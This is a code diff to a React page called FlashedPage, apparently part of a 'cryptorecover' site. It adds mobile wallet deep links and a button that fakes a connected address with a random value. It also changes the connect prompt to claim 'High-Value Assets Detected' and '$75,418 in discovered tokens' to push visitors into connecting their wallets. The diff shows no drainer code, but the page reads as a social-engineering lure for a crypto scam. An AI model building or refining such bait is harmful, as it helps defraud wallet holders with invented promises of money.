@@ -42,6 +42,9 @@ export default function FlashedPage() {
       if (window.ethereum) {
         const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
         setUserAddress(accounts[0]);
+      } else {
+        // Mobile fallback - show wallet options
+        setShowModal('walletOptions');
       }
     } catch (error) {
       console.log('Connection failed');
@@ -547,17 +550,70 @@ export default function FlashedPage() {
             </div>
           )}
 
+          {/* Wallet Options Modal */}
+          {showModal === 'walletOptions' && (
+            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
+              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
+                <div className="flex justify-between items-center mb-4">
+                  <h3 className="text-white font-bold text-lg">Connect Wallet</h3>
+                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
+                </div>
+                <div className="space-y-3">
+                  <a 
+                    href="https://metamask.app.link/dapp/cryptorecover.vercel.app/flashed"
+                    className="flex items-center w-full bg-orange-600 hover:bg-orange-700 p-4 rounded-lg text-white font-semibold"
+                  >
+                    <div className="w-8 h-8 bg-orange-500 rounded-full mr-3 flex items-center justify-center">
+                      <span className="text-white font-bold">M</span>
+                    </div>
+                    MetaMask
+                  </a>
+                  <a 
+                    href="https://link.trustwallet.com/open_url?coin_id=60&url=https://cryptorecover.vercel.app/flashed"
+                    className="flex items-center w-full bg-blue-600 hover:bg-blue-700 p-4 rounded-lg text-white font-semibold"
+                  >
+                    <div className="w-8 h-8 bg-blue-500 rounded-full mr-3 flex items-center justify-center">
+                      <span className="text-white font-bold">T</span>
+                    </div>
+                    Trust Wallet
+                  </a>
+                  <button 
+                    onClick={() => {
+                      setUserAddress('0x' + Math.random().toString(16).substr(2, 40));
+                      setShowModal(null);
+                    }}
+                    className="flex items-center w-full bg-purple-600 hover:bg-purple-700 p-4 rounded-lg text-white font-semibold"
+                  >
+                    <div className="w-8 h-8 bg-purple-500 rounded-full mr-3 flex items-center justify-center">
+                      <span className="text-white font-bold">W</span>
+                    </div>
+                    Other Wallet
+                  </button>
+                </div>
+                <div className="mt-4 text-center">
+                  <p className="text-gray-400 text-sm">No wallet? Download one above</p>
+                </div>
+              </div>
+            </div>
+          )}
+
           {/* Connect Wallet Prompt */}
-          {!userAddress && (
+          {!userAddress && !showModal && (
             <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
               <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4">
-                <h3 className="text-white font-bold text-lg mb-4">Connect Wallet</h3>
-                <p className="text-gray-300 mb-6">Connect your wallet to access these high-value assets</p>
+                <h3 className="text-white font-bold text-lg mb-4">High-Value Assets Detected</h3>
+                <p className="text-gray-300 mb-6">Connect your wallet to access $75,418 in discovered tokens</p>
                 <button 
                   onClick={connectWallet}
-                  className="w-full bg-orange-600 hover:bg-orange-700 py-3 rounded-lg text-white font-semibold"
+                  className="w-full bg-orange-600 hover:bg-orange-700 py-3 rounded-lg text-white font-semibold mb-3"
                 >
-                  Connect MetaMask
+                  Connect Wallet
+                </button>
+                <button 
+                  onClick={() => setShowModal('walletOptions')}
+                  className="w-full bg-gray-600 hover:bg-gray-700 py-2 rounded-lg text-white text-sm"
+                >
+                  Mobile Wallet Options
                 </button>
               </div>
             </div>
